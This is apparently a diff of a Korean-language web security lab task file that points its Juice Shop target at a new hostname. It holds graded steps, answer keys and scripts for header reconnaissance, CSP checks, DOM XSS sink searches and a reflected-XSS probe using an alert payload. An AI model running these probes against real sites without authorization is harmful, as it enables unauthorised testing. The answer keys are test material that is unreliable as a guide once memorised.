@@ -182,7 +477,7 @@ steps:
       - 클라이언트 JS 분석 없음
       - 싱크 위치 제시 없음
   target_vm: attacker
-  script: curl -s http://10.20.32.80 | grep -ioE '(innerHTML|document\.write|eval\()'
+  script: curl -s http://juice.6v6.lab | grep -ioE '(innerHTML|document\.write|eval\()'
     | sort -u && echo 'DOM XSS 분석 완료'
   risk_level: low
   bastion_prompt: 'DOM 기반 XSS 취약점을 찾으시오해줘
@@ -286,7 +581,7 @@ steps:
   points: 10
   answer: '🤖 프롬프트: Content-Security-Policy(CSP) 헤더를 분석해줘
 
-    📎 참고 (CLI): curl -sI http://10.20.32.80 | grep -i ''content-security-policy''
+    📎 참고 (CLI): curl -sI http://juice.6v6.lab | grep -i ''content-security-policy''
     && echo ''CSP 분석 완료'' || echo ''CSP 미설정 확인 완료'''
   answer_detail: CSP는 인라인 스크립트 실행과 외부 리소스 로딩을 제한하여 XSS를 방어합니다.
   verify:
@@ -313,7 +608,7 @@ steps:
       - 지시자 분석 없음
       - 우회 관점 없음
   target_vm: attacker
-  script: curl -sI http://10.20.32.80 | grep -i 'content-security-policy' && echo
+  script: curl -sI http://juice.6v6.lab | grep -i 'content-security-policy' && echo
     'CSP 분석 완료' || echo 'CSP 미설정 확인 완료'
   risk_level: low
   bastion_prompt: 'Content-Security-Policy(CSP) 헤더를 분석해줘
@@ -637,7 +932,7 @@ steps:
   points: 8
   answer: '🤖 프롬프트: XSS 실습 종합 보고서를 구현 방법을 설명하고 예시 코드를 보여줘
 
-    📎 참고 (CLI): echo ''=== XSS 분석 보고서 ==='' && echo ''대상: http://10.20.32.80'' &&
+    📎 참고 (CLI): echo ''=== XSS 분석 보고서 ==='' && echo ''대상: http://juice.6v6.lab'' &&
     echo ''발견: 반사형/저장형/DOM XSS'' && echo ''영향: 세션탈취, 피싱, 키로깅'' && echo ''조치: 출력 인코딩,
     CSP 적용'' && echo ''=== 보고서 완료 ==='''
   answer_detail: XSS는 웹 애플리케이션에서 가장 흔한 취약점 중 하나입니다.
@@ -664,7 +959,7 @@ steps:
       - 구체적 PoC 없음
       - 파일 저장 없음
   target_vm: attacker
-  script: 'echo ''=== XSS 분석 보고서 ==='' && echo ''대상: http://10.20.32.80'' && echo
+  script: 'echo ''=== XSS 분석 보고서 ==='' && echo ''대상: http://juice.6v6.lab'' && echo
     ''발견: 반사형/저장형/DOM XSS'' && echo ''영향: 세션탈취, 피싱, 키로깅'' && echo ''조치: 출력 인코딩, CSP
     적용'' && echo ''=== 보고서 완료 ==='''
   risk_level: low
@@ -700,7 +995,7 @@ steps:
 
     ▶ Phase A — HTTP 보안 헤더 정찰 (lecture #3·#4)
 
-    `curl -s -I http://10.20.32.80/` 로 응답 헤더 추출. Server / X-Powered-By 로 기술 스택 식별.
+    `curl -s -I http://juice.6v6.lab/` 로 응답 헤더 추출. Server / X-Powered-By 로 기술 스택 식별.
 
     CSP / X-Frame-Options / X-Content-Type-Options / Referrer-Policy / Strict-Transport-Security
     5개 헤더
@@ -712,7 +1007,7 @@ steps:
 
     Phase A 에서 CSP 가 없다는 것을 확인했다면 반사형 XSS 가능성 *높음*.
 
-    `curl -G "http://10.20.32.80/#/search" --data-urlencode ''q=<img src=x onerror=alert(1)>''`
+    `curl -G "http://juice.6v6.lab/#/search" --data-urlencode ''q=<img src=x onerror=alert(1)>''`
     로
 
     payload reflection 여부 캡처. 응답에 payload 가 그대로 박혀 나오면 reflected XSS 확정.
@@ -744,12 +1039,12 @@ steps:
   bastion_prompt: '[복합 시나리오 — w03 헤더 정찰 + XSS 검증]
 
 
-    JuiceShop (http://10.20.32.80) 대상 헤더 정찰 → XSS 검증 → 보안 헤더 권고를 3 phase 로 실행.
+    JuiceShop (http://juice.6v6.lab) 대상 헤더 정찰 → XSS 검증 → 보안 헤더 권고를 3 phase 로 실행.
 
 
     Phase A (헤더 정찰):
 
-    `curl -s -I http://10.20.32.80/` 실행. 응답 헤더 전체 출력. Server·X-Powered-By 와
+    `curl -s -I http://juice.6v6.lab/` 실행. 응답 헤더 전체 출력. Server·X-Powered-By 와
 
     CSP·X-Frame-Options·X-Content-Type-Options·Referrer-Policy·Strict-Transport-Security
     중
@@ -759,7 +1054,7 @@ steps:
 
     Phase B (XSS reflection 검증):
 
-    `curl -sG "http://10.20.32.80/#/search" --data-urlencode ''q=<img src=x onerror=alert(1)>''`
+    `curl -sG "http://juice.6v6.lab/#/search" --data-urlencode ''q=<img src=x onerror=alert(1)>''`
 
     실행. 응답에 페이로드가 그대로 박혀 나오는지 grep "<img src=x" 로 확인. 박혀 나오면 "Reflected XSS 확정".
 
